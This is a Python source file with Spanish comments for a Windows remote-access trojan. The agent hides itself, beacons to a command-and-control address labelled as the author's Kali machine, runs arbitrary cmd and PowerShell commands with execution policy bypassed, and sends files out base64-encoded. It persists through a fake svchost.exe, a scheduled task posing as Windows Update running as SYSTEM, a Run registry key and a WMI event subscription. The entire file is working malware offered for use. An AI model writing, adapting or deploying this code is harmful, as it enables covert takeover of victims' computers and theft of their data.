# windows_agent_background.py - EJECUCIÓN TOTAL EN BACKGROUND
import sys
import os
import socket
import struct
import json
import base64
import time
import random
import hashlib
import subprocess
import ctypes
import threading
import winreg
import tempfile
import shutil
import win32api
import win32con
import win32process
import win32event
import winerror
from datetime import datetime

# ============================================
# CONFIGURACIÓN
# ============================================
C2_IP = "192.168.254.137"  # TU IP KALI
C2_PORT = 4444

# ============================================
# EJECUCIÓN EN BACKGROUND COMPLETA
# ============================================

def run_as_background_service():
    """Ejecutar como proceso completamente oculto"""
    
    # 1. Ocultar consola INMEDIATAMENTE
    hide_console_immediately()
    
    # 2. Crear mutex para evitar múltiples instancias
    mutex_name = "Global\\WindowsSecurityAgent_Mutex"
    mutex = create_mutex(mutex_name)
    if not mutex:
        sys.exit(0)  # Ya hay otra instancia ejecutándose
    
    # 3. Desvincular de consola padre
    if hasattr(sys, 'frozen'):
        detach_from_console()
    
    # 4. Cambiar prioridad del proceso
    set_process_priority()
    
    # 5. Iniciar en hilo separado
    agent_thread = threading.Thread(target=main_agent, daemon=True)
    agent_thread.start()
    
    # 6. Mantener proceso vivo (sin bloquear)
    try:
        while True:
            win32event.WaitForSingleObject(mutex, win32event.INFINITE)
    except KeyboardInterrupt:
        pass
    finally:
        if mutex:
            win32api.CloseHandle(mutex)

def hide_console_immediately():
    """Ocultar consola al inicio"""
    try:
        # Método 1: Ocultar ventana
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
        
        # Método 2: Desasociar de consola
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        kernel32.FreeConsole()
        
    except:
        pass

def create_mutex(name):
    """Crear mutex para instancia única"""
    try:
        return win32event.CreateMutex(None, False, name)
    except:
        return None

def detach_from_console():
    """Desvincular completamente de la consola"""
    try:
        # Crear proceso hijo sin consola
        startupinfo = win32process.STARTUPINFO()
        startupinfo.dwFlags |= win32con.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = win32con.SW_HIDE
        
        # Obtener comando actual
        cmd = sys.executable
        args = ' '.join(sys.argv)
        
        # Crear proceso
        win32process.CreateProcess(
            None,  # No module name (use command line)
            f'"{cmd}" {args} --background',
            None,  # Process handle not inheritable
            None,  # Thread handle not inheritable
            False,  # Set handle inheritance to FALSE
            win32process.CREATE_NO_WINDOW,  # No console window
            None,  # Use parent's environment block
            None,  # Use parent's starting directory 
            startupinfo
        )
        
        sys.exit(0)  # Terminar proceso padre
        
    except:
        pass

def set_process_priority():
    """Establecer prioridad baja para pasar desapercibido"""
    try:
        # PRIORIDAD_IDLE (más baja posible)
        ctypes.windll.kernel32.SetPriorityClass(
            ctypes.windll.kernel32.GetCurrentProcess(),
            0x00000040  # IDLE_PRIORITY_CLASS
        )
    except:
        pass

# ============================================
# PROTOCOLO DE COMUNICACIÓN (SILENCIOSO)
# ============================================

class SilentProtocol:
    @staticmethod
    def send(sock, data):
        """Enviar datos sin logging"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        key = struct.pack('I', int(time.time()) % 1000000)
        encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        
        length = len(encrypted)
        sock.sendall(struct.pack('>I', length) + encrypted)
    
    @staticmethod
    def receive(sock, timeout=30):
        """Recibir datos sin logging"""
        sock.settimeout(timeout)
        
        try:
            length_data = sock.recv(4)
            if not length_data or len(length_data) != 4:
                return None
            
            length = struct.unpack('>I', length_data)[0]
            
            encrypted = b''
            while len(encrypted) < length:
                chunk = sock.recv(min(4096, length - len(encrypted)))
                if not chunk:
                    return None
                encrypted += chunk
            
            key = struct.pack('I', int(time.time()) % 1000000)
            decrypted = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])
            
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return None

# ============================================
# AGENTE SILENCIOSO (SIN PRINT)
# ============================================

class SilentAgent:
    def __init__(self):
        self.agent_id = self._get_system_id()
        self.protocol = SilentProtocol()
        
    def _get_system_id(self):
        """Generar ID único silenciosamente"""
        try:
            hostname = socket.gethostname()
            username = os.getenv('USERNAME', 'Unknown')
            volume = ctypes.c_ulong(0)
            ctypes.windll.kernel32.GetVolumeInformationW(
                "C:\\", None, 0, ctypes.byref(volume), None, None, None, 0
            )
            return hashlib.md5(f"{hostname}{username}{volume.value}".encode()).hexdigest()[:8]
        except:
            return hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
    
    def _check_privileges(self):
        """Verificar privilegios sin output"""
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return "Admin" if is_admin else "User"
        except:
            return "Unknown"
    
    def connect_to_c2(self):
        """Conexión silenciosa al C2"""
        while True:
            try:
                # Conectar
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((C2_IP, C2_PORT))
                
                # Enviar handshake
                agent_info = {
                    'type': 'agent_connect',
                    'agent_id': self.agent_id,
                    'hostname': socket.gethostname(),
                    'username': os.getenv('USERNAME', 'Unknown'),
                    'os': sys.platform,
                    'timestamp': datetime.now().isoformat(),
                    'privileges': self._check_privileges()
                }
                
                self.protocol.send(sock, json.dumps(agent_info))
                
                # Loop de comandos
                self._command_loop(sock)
                
                sock.close()
                
            except (ConnectionRefusedError, socket.timeout):
                time.sleep(5)  # Esperar antes de reintentar
            except Exception:
                time.sleep(10)
    
    def _command_loop(self, sock):
        """Procesar comandos sin logging"""
        while True:
            try:
                raw_data = self.protocol.receive(sock, timeout=60)
                if raw_data is None:
                    break
                
                try:
                    cmd_data = json.loads(raw_data)
                    cmd_type = cmd_data.get('type', 'command')
                    
                    if cmd_type == 'command':
                        command = cmd_data.get('command', '')
                        result = self._execute_command(command)
                        
                        response = {
                            'type': 'command_result',
                            'agent_id': self.agent_id,
                            'command': command,
                            'result': result,
                            'timestamp': datetime.now().isoformat()
                        }
                        
                        self.protocol.send(sock, json.dumps(response))
                    
                    elif cmd_type == 'exit':
                        return
                    
                    elif cmd_type == 'ping':
                        self.protocol.send(sock, json.dumps({'type': 'pong'}))
                    
                except json.JSONDecodeError:
                    result = self._execute_command(raw_data)
                    self.protocol.send(sock, result)
                
            except socket.timeout:
                self.protocol.send(sock, json.dumps({'type': 'alive', 'agent_id': self.agent_id}))
            except Exception:
                break
    
    def _execute_command(self, cmd):
        """Ejecutar comando silenciosamente"""
        try:
            cmd_lower = cmd.strip().lower()
            
            if cmd_lower == 'sysinfo':
                return self._get_system_info()
            
            elif cmd_lower.startswith('download '):
                filepath = cmd[9:].strip()
                return self._download_file(filepath)
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            if any(x in cmd_lower for x in ['get-', 'powershell', '|', 'select-']):
                shell = 'powershell.exe'
                args = ['-ExecutionPolicy', 'Bypass', '-Command', cmd]
            else:
                shell = 'cmd.exe'
                args = ['/c', cmd]
            
            process = subprocess.run(
                [shell] + args,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=60,
                text=True,
                errors='ignore'
            )
            
            output = f"[EXIT CODE: {process.returncode}]\n"
            if process.stdout:
                output += f"STDOUT:\n{process.stdout}\n"
            if process.stderr:
                output += f"STDERR:\n{process.stderr}"
            
            return output if output.strip() else "[+] Comando ejecutado (sin output)"
            
        except subprocess.TimeoutExpired:
            return "ERROR: Timeout (60 segundos)"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def _get_system_info(self):
        """Obtener info del sistema"""
        info = []
        info.append(f"Hostname: {socket.gethostname()}")
        info.append(f"Usuario: {os.getenv('USERNAME', 'Unknown')}")
        info.append(f"Sistema: {sys.platform}")
        return "\n".join(info)
    
    def _download_file(self, filepath):
        """Descargar archivo"""
        try:
            if not os.path.exists(filepath):
                return f"ERROR: Archivo no encontrado: {filepath}"
            
            with open(filepath, 'rb') as f:
                content = f.read()
            
            encoded = base64.b64encode(content).decode('ascii')
            return f"FILE:{os.path.basename(filepath)}:{encoded}"
        except Exception as e:
            return f"ERROR downloading {filepath}: {str(e)}"

# ============================================
# PERSISTENCIA AVANZADA (SILENCIOSA)
# ============================================

def install_silently():
    """Instalación completamente silenciosa"""
    try:
        # Ruta actual
        if hasattr(sys, 'frozen'):
            current_path = sys.executable
        else:
            current_path = os.path.abspath(sys.argv[0])
        
        # Directorio de instalación oculto
        install_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SecurityCache')
        os.makedirs(install_dir, exist_ok=True)
        
        install_path = os.path.join(install_dir, 'svchost.exe')  # Nomre que parece legítimo
        
        if current_path != install_path:
            shutil.copy2(current_path, install_path)
            
            # Ocultar archivo
            ctypes.windll.kernel32.SetFileAttributesW(install_path, 2)
        
        # 1. Tarea programada (más confiable)
        task_name = "WindowsUpdateMaintenance"
        xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Windows Update Maintenance</Description></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <SessionStateChangeTrigger><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <Enabled>true</Enabled>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
  </Settings>
  <Actions><Exec><Command>{install_path}</Command></Exec></Actions>
</Task>'''
        
        xml_path = os.path.join(tempfile.gettempdir(), f'task_{random.randint(1000,9999)}.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_content)
        
        subprocess.run(f'schtasks /create /xml "{xml_path}" /tn "{task_name}" /f', 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        os.remove(xml_path)
        
        # 2. Registry Run
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, install_path)
            winreg.CloseKey(key)
        except:
            pass
        
        # 3. WMI Event Subscription (persistencia avanzada)
        try:
            wmi_script = f'''
Set objWMIService = GetObject("winmgmts:\\\\.\\root\\subscription")
Set objEventFilter = objWMIService.Get("__EventFilter").SpawnInstance_
objEventFilter.QueryLanguage = "WQL"
objEventFilter.Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
objEventFilter.Name = "SystemMonitor"
objEventFilter.EventNamespace = 'root\\cimv2'
Set objFilterPath = objWMIService.Put_(objEventFilter)

Set objEventConsumer = objWMIService.Get("ActiveScriptEventConsumer").SpawnInstance_
objEventConsumer.Name = "SystemMonitorScript"
objEventConsumer.ScriptingEngine = "VBScript"
objEventConsumer.ScriptText = "CreateObject(""WScript.Shell"").Run ""{install_path}"", 0, False"
Set objConsumerPath = objWMIService.Put_(objEventConsumer)

Set objBinding = objWMIService.Get("__FilterToConsumerBinding").SpawnInstance_
objBinding.Filter = objFilterPath
objBinding.Consumer = objConsumerPath
objBinding.Put_
'''
            
            vbs_path = os.path.join(tempfile.gettempdir(), f'wmi_{random.randint(1000,9999)}.vbs')
            with open(vbs_path, 'w') as f:
                f.write(wmi_script)
            
            subprocess.run(['cscript', '//B', vbs_path], 
                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            os.remove(vbs_path)
        except:
            pass
        
        # Ejecutar la copia instalada
        if install_path != current_path:
            subprocess.Popen([install_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
            return True
            
    except Exception:
        return False
    
    return False

# ============================================
# FUNCIÓN PRINCIPAL DEL AGENTE
# ============================================

def main_agent():
    """Función principal del agente (sin prints)"""
    # Instalar persistencia si no estamos en modo debug
    if '--debug' not in sys.argv and '--no-install' not in sys.argv:
        install_silently()
    
    # Iniciar agente silencioso
    agent = SilentAgent()
    agent.connect_to_c2()

# ============================================
# PUNTO DE ENTRADA
# ============================================

def main():
    """Punto de entrada principal - COMPLETAMENTE SILENCIOSO"""
    if '--debug' in sys.argv:
        # Modo debug con consola
        print("[DEBUG] Agent starting...")
        main_agent()
    else:
        # Modo producción - completamente silencioso
        run_as_background_service()

if __name__ == "__main__":
    # Para ejecución directa
    if len(sys.argv) > 1 and sys.argv[1] == "--background":
        # Ejecutar directamente en background
        main_agent()
    else:
        # Ejecutar con gestión de background
        main()
